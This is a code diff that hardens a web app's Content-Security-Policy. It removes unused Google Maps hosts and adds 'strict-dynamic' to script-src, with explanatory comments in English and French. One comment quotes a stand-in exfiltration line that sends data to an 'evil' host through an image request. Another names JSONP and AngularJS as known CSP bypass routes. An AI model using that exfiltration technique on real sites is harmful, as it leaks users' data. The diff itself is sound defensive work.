@@ -25,20 +25,26 @@ function buildCsp(nonce: string): string {
     "style-src 'self' 'unsafe-inline' https://fonts.googleapis.com",
     // Fonts: Google Fonts + Perplexity AI + data URIs
     "font-src 'self' https://fonts.gstatic.com https://r2cdn.perplexity.ai data:",
-    // Images: self + data/blob + Google Maps tiles.
+    // Images: self + data/blob + les visuels du badge reCAPTCHA.
     // SECURITY: a blanket `https:` used to be allowed here, which turns any XSS
     // into a working exfiltration channel (`new Image().src =
     // 'https://evil/?'+data` needs no CORS and no user interaction). There is no
     // functional need for it: next.config.ts sets `remotePatterns: []`, so
     // next/image optimises no remote host.
     // www.google.com / www.gstatic.com are needed for the reCAPTCHA badge assets.
-    "img-src 'self' data: blob: https://maps.googleapis.com https://maps.gstatic.com https://www.google.com https://www.gstatic.com",
-    // Connexions: Vercel Analytics + Speed Insights + reCAPTCHA + Google Maps + Vercel Live
-    "connect-src 'self' https://vitals.vercel-insights.com https://vercel-insights.com https://www.google.com https://www.gstatic.com https://maps.googleapis.com https://maps.gstatic.com https://*.googleapis.com https://vercel.live wss://ws-us3.pusher.com https://sockjs-us3.pusher.com",
+    //
+    // Les hôtes Google Maps ont été retirés de cette directive et des trois
+    // suivantes : aucune carte n'est chargée nulle part dans l'application
+    // (vérifié — les seules occurrences de « maps » dans le code sont les mots
+    // anglais « maps to » et « remaps »). Une origine autorisée mais inutilisée
+    // n'est que de la surface d'attaque offerte.
+    "img-src 'self' data: blob: https://www.google.com https://www.gstatic.com",
+    // Connexions: Vercel Analytics + Speed Insights + reCAPTCHA + Vercel Live
+    "connect-src 'self' https://vitals.vercel-insights.com https://vercel-insights.com https://www.google.com https://www.gstatic.com https://vercel.live wss://ws-us3.pusher.com https://sockjs-us3.pusher.com",
     // Fermeture sécurité object/frame
     "object-src 'none'",
-    // Allow Google Maps + reCAPTCHA + Vercel Live embeds
-    "frame-src https://www.google.com https://recaptcha.google.com https://www.recaptcha.net https://maps.googleapis.com https://vercel.live",
+    // Le défi reCAPTCHA s'affiche dans une iframe ; Vercel Live pour les aperçus.
+    "frame-src https://www.google.com https://recaptcha.google.com https://www.recaptcha.net https://vercel.live",
     "frame-ancestors 'none'",
     // Base et form
     "base-uri 'self'",
@@ -73,12 +79,19 @@ function buildCsp(nonce: string): string {
   // allow-list sources, and either one makes the browser ignore
   // 'unsafe-inline' — so this adds an allowance for exactly one known script,
   // and weakens nothing.
+  // 'strict-dynamic' : sans lui, la liste d'hôtes ci-dessous est active, et
+  // www.google.com / www.gstatic.com sont des vecteurs de contournement connus
+  // (points JSONP et vieilles copies d'AngularJS qui exécutent du JS arbitraire
+  // malgré le nonce). Avec lui, un navigateur moderne ignore 'self' ET toute la
+  // liste d'hôtes : seuls s'exécutent les scripts porteurs du nonce ou du hash,
+  // et ceux qu'ils chargent eux-mêmes. Les hôtes restent déclarés en repli pour
+  // les navigateurs qui ne connaissent pas 'strict-dynamic'.
   const scriptSrc =
-    `script-src 'self' 'nonce-${nonce}' ${themeScriptCspHash()}` +
+    `script-src 'self' 'strict-dynamic' 'nonce-${nonce}' ${themeScriptCspHash()}` +
     (process.env.NODE_ENV === "production"
       ? ""
       : " 'unsafe-eval' https://vercel.live https://*.vercel.live") +
-    " https://va.vercel-scripts.com https://www.google.com https://www.gstatic.com https://maps.googleapis.com https://maps.gstatic.com";
+    " https://va.vercel-scripts.com https://www.google.com https://www.gstatic.com";
   baseCsp.push(scriptSrc);
 
   return baseCsp.join("; ");
